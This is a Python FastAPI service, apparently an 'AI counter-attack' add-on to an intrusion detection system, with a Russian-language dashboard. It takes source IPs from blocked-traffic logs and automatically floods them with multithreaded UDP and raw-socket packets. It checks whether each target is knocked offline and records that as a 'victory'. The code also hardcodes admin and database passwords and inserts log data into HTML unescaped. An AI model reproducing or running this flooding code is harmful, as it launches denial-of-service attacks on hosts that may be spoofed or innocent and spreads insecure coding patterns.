import socket
import struct
import threading
import time
import secrets
import random
import subprocess
from fastapi import FastAPI, Form, Depends, HTTPException, status, Response
from fastapi.responses import HTMLResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from psycopg2 import pool

app = FastAPI(title="XDP Counter-Attack Engine")
security = HTTPBasic()

SECURITY_USER, SECURITY_PASS = "admin", "kernel_secure_2026"
db_conf = "dbname=ids_db user=postgres password=ids_pass host=localhost"
db_pool = pool.ThreadedConnectionPool(1, 15, db_conf)

ATTACK_METRICS = {
    "active_targets": 0,
    "packets_sent": 0,
    "last_attack_type": "None",
    "ai_aggression_level": 50,
    "is_auto_retaliation": True
}
metrics_lock = threading.Lock()
active_retaliations = set()

def authenticate(credentials: HTTPBasicCredentials = Depends(security)):
    u_ok = secrets.compare_digest(credentials.username, SECURITY_USER)
    p_ok = secrets.compare_digest(credentials.password, SECURITY_PASS)
    if not (u_ok and p_ok):
        raise HTTPException(status_code=401, detail="Unauthorized")
    return credentials.username

def ai_calculate_retaliation(dport, attack_count):
    # Защита от SyntaxError: проверяем конкретные веб-порты напрямую
    if dport == 80 or dport == 443 or dport == 8080:
        strategy = 1  # TCP SYN-флуд
    elif dport == 0:
        strategy = 0  # UDP-флуд
    else:
        strategy = 2  # Смешанный тип
        
    base_threads = int(ATTACK_METRICS["ai_aggression_level"] / 10)
    multiplier = 2 if attack_count > 10 else 1
    return strategy, max(1, base_threads * multiplier)

def check_target_alive(target_ip, dport=80):
    """ Проверка: если цель упала (поражена), возвращает False """
    if dport == 80 or dport == 443 or dport == 8080:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            res = sock.connect_ex((target_ip, dport))
            sock.close()
            if res == 0: return True
        except: pass
    try:
        res = subprocess.run(["ping", "-c", "1", "-W", "1", target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return res.returncode == 0
    except:
        return True

def log_victory_to_db(target_ip, reason):
    try:
        conn = db_pool.getconn()
        cur = conn.cursor()
        cur.execute("INSERT INTO security_events (src_ip, dport, action, reason) VALUES (%s, 0, 'VICTORY', %s)", (target_ip, reason))
        conn.commit()
        cur.close()
        db_pool.putconn(conn)
        print(f"[🔥 SUCCESS] Цель {target_ip} успешно нейтрализована!")
    except Exception as e: print(f"DB Error: {e}")

def flood_udp(target_ip, dport=0, duration=30):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    end_time = time.time() + duration
    chk = 0
    while time.time() < end_time and target_ip in active_retaliations:
        try:
            port = random.randint(1, 65535) if dport == 0 else dport
            sock.sendto(payload, (target_ip, port))
            with metrics_lock: ATTACK_METRICS["packets_sent"] += 1
            chk += 1
            if chk % 3000 == 0 and not check_target_alive(target_ip, dport):
                with metrics_lock:
                    if target_ip in active_retaliations:
                        active_retaliations.remove(target_ip)
                        log_victory_to_db(target_ip, "AI: Target offline (UDP channel exhausted).")
                break
        except: pass

def flood_tcp_syn(target_ip, dport=80, duration=30):
    try: sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except: return
    end_time = time.time() + duration
    chk = 0
    while time.time() < end_time and target_ip in active_retaliations:
        try:
            packet = random._urandom(64)
            port = random.randint(1, 65535) if dport == 0 else dport
            sock.sendto(packet, (target_ip, port))
            with metrics_lock: ATTACK_METRICS["packets_sent"] += 1
            chk += 1
            if chk % 3000 == 0 and not check_target_alive(target_ip, dport):
                with metrics_lock:
                    if target_ip in active_retaliations:
                        active_retaliations.remove(target_ip)
                        log_victory_to_db(target_ip, "AI: Target down (TCP SYN Overload).")
                break
        except: pass

def retaliation_orchestrator():
    while True:
        if not ATTACK_METRICS["is_auto_retaliation"]:
            time.sleep(2)
            continue
        try:
            conn = db_pool.getconn(); cur = conn.cursor()
            cur.execute("SELECT src_ip, dport, COUNT(*) FROM security_events WHERE action = 'BLOCKED' AND created_at > NOW() - INTERVAL '10 second' GROUP BY src_ip, dport;")
            targets = cur.fetchall(); cur.close(); db_pool.putconn(conn)
            for ip, dport, count in targets:
                if ip in active_retaliations or ip == "SYSTEM": continue
                strat, threads = ai_calculate_retaliation(dport, count)
                with metrics_lock:
                    active_retaliations.add(ip)
                    ATTACK_METRICS["active_targets"] = len(active_retaliations)
                    ATTACK_METRICS["last_attack_type"] = "TCP-SYN" if strat == 1 else "UDP-Flood"
                t_func = flood_tcp_syn if strat == 1 else flood_udp
                print(f"[🔥 AI] Контратака на {ip} в {threads} потоков.")
                for _ in range(threads):
                    threading.Thread(target=t_func, args=(ip, dport, 25), daemon=True).start()
        except Exception as e: print(f"Orchestrator Err: {e}")
        time.sleep(5)

@app.post("/api/counter/control")
def ctrl_attack(action: str = Form(...), value: int = Form(None), u=Depends(authenticate)):
    with metrics_lock:
        if action == "toggle": ATTACK_METRICS["is_auto_retaliation"] = not ATTACK_METRICS["is_auto_retaliation"]
        elif action == "aggression" and value: ATTACK_METRICS["ai_aggression_level"] = value
        elif action == "stop_all": 
            active_retaliations.clear()
            ATTACK_METRICS["active_targets"] = 0
    return Response(status_code=303, headers={"Location": "/"})

@app.get("/", response_class=HTMLResponse)
def counter_dashboard(u=Depends(authenticate)):
    conn = db_pool.getconn(); cur = conn.cursor()
    cur.execute("SELECT src_ip, dport, action, reason FROM security_events ORDER BY id DESC LIMIT 10;")
    logs = cur.fetchall(); cur.close(); db_pool.putconn(conn)
    rows = "".join([f"<tr><td>{l[0]}</td><td>{l[1]}</td><td>{l[2]}</td><td>{l[3]}</td></tr>" for l in logs])
    t_html = "".join([f"<li>🎯 {ip} <span style='color:red;'>[ПОД ОГНЕМ ИИ]</span></li>" for ip in list(active_retaliations)])
    st_auto = "АКТИВЕН" if ATTACK_METRICS["is_auto_retaliation"] else "ВЫКЛЮЧЕН"
    return f"""
    <html><head><title>Retaliation Engine</title><style>
        body {{ font-family: sans-serif; background: #121212; color: #e0e0e0; margin: 30px; }}
        .box {{ background: #1e1e1e; padding: 20px; border-radius: 8px; margin-bottom: 20px; border-left: 5px solid #e74c3c; }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 10px; }}
        th, td {{ padding: 12px; border-bottom: 1px solid #333; text-align: left; }}
        th {{ background: #292929; color: #e74c3c; }} 
        button {{ padding: 8px 15px; cursor: pointer; background: #e74c3c; color: white; border: none; border-radius: 4px; }}
    </style></head><body>
        <h1>🔥 Модуль ИИ-Контратаки и Наступательного Противодействия</h1>
        <div class="box">
            Авто-ответ: <b>{st_auto}</b> | Уровень агрессии ИИ: <b>{ATTACK_METRICS['ai_aggression_level']}%</b> | Пакеты возмездия: <b>{ATTACK_METRICS['packets_sent']}</b>
            <br><br>
            <form action="/api/counter/control" method="post" style="display:inline;"><input type="hidden" name="action" value="toggle"><button style="background:#3498db">Режим</button></form>
            <form action="/api/counter/control" method="post" style="display:inline;"><input type="hidden" name="action" value="stop_all"><button>Прекратить всё</button></form>
        </div>
        <div style="display:flex; gap:20px;">
            <div class="box" style="flex:1;">
                <h2>Цели ({ATTACK_METRICS['active_targets']})</h2><ul>{t_html or "<li>Ожидание угроз...</li>"}</ul>
                <form action="/api/counter/control" method="post"><input type="hidden" name="action" value="aggression">Мощность: <input type="number" name="value" min="10" max="100" value="{ATTACK_METRICS['ai_aggression_level']}" style="background:#333;color:#fff;"><button style="background:#2ecc71">Задать</button></form>
            </div>
            <div class="box" style="flex:2;"><h2>События XDP/IPS и Результаты</h2><table><tr><th>IP</th><th>Порт</th><th>Статус</th><th>Причина</th></tr>{rows}</table></div>
        </div>
        <script>setTimeout(() => location.reload(), 4000);</script>
    </body></html>
    """

@app.on_event("startup")
def startup_orchestration():
    threading.Thread(target=retaliation_orchestrator, daemon=True).start()

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)
